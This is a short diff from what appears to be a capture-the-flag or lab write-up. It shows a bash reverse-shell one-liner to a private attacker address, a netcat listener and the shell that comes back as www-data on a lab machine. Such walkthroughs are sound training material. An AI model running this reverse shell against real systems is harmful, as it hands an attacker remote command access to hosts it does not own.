@@ -70,7 +70,21 @@ Just use a reverse shell to get it :
 bash -c 'exec bash -i &>/dev/tcp/192.168.127.128/4444 <&1'
 ```
 
+start a netcat listener :
 
+```bash
+root@kali: nc -nvlp 4444                  
+listening on [any] 4444 ...
+connect to [192.168.127.128] from (UNKNOWN) [192.168.127.134] 57536
+bash: cannot set terminal process group (1306): Inappropriate ioctl for device
+bash: no job control in this shell
 
+www-data@ConverterPlus:/var/www/html/convert.me/public_html$ cd /home
+
+www-data@ConverterPlus:/home$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+There is no need to get root on this machine :)
 
 
